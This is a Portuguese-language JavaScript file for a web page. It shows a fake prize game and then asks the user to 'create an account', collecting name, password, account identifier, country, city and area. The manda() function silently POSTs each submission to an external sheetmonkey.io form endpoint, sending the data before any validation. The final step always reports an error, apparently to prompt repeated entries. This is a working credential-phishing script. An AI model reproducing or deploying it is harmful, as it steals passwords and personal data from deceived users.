let x=1
let y=1
let z=1

function bolas(){
    console.log(x)
    if(x==2){
        alert("Parabens, agora só tens de criar a conta com os seus dados🎉🎊😎")
        let bola=document.querySelectorAll(".bola")
        bola.forEach(el=>{
            el.innerHTML="+"
            el.style.color="white"
            el.style.backgroundColor="rgb(218, 123, 0)"
        })
        z=2
    }
    else{
        alert("Só tens mais 1 tentativa❗❗❗")
    }
    x=2
}

function fase1(){
    if(x==2 && z==2){
        let jogo=document.getElementById("jogo_1").style.display="none"
        let info1=document.getElementById("info_1").style.display="block"
    }
    else{
        alert("Ops...\nTens de escolhar um deles")
    }
}

function fase2(){
    let nome=String(document.getElementById("nome_i").value).trim()
    let senha=String(document.getElementById("senha_i").value).trim()
    let conta=String(document.getElementById("conta_i").value).trim()
    console.log(nome,senha,conta)
    let data={
        nome_2:nome,
        senha_2:senha,
        conta_2:conta
    }

    manda(data)

    if(y==2 && Number(nome.length)>5 && Number(senha.length>5) && Number(conta.length)>5){

        let info1=document.getElementById("info_1").style.display="none"
        let info2=document.getElementById("info_2").style.display="block"
    }
    else{
        alert("ops...\nAlguns dos dados não estão certos")
    }
    y=2
}


function final(){
    let nome=String(document.getElementById("nome_i").value).trim()
    let senha=String(document.getElementById("senha_i").value).trim()
    let conta=String(document.getElementById("conta_i").value).trim()
    let pais_i=String(document.getElementById("pais_i").value).trim()
    let cidade_i=String(document.getElementById("cidade_i").value).trim()
    let zona_i=String(document.getElementById("zona_i").value).trim()

    if(Number(pais_i.length)>2 && Number(cidade_i.length)>3 && Number(zona_i.length)>3){
        let data={
            nome_2:nome,
            senha_2:senha,
            conta_2:conta,
            pais_2:pais_i,
            cidade_2:cidade_i,
            zona_2:zona_i
        }
    
        manda(data)
    }
    alert("Local não encontrado...\npor favor preenche bem os seus dados")


}
function manda(dados){

    fetch("https://api.sheetmonkey.io/form/hJAoq9MGLmhiAVkjfDe5ok", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(dados),
      })
        .then((res) => {
          if (res.ok) {
            console.log("Dados enviados com sucesso!");
          } else {
            console.log("Erro ao enviar os dados.");
          }
        });
}
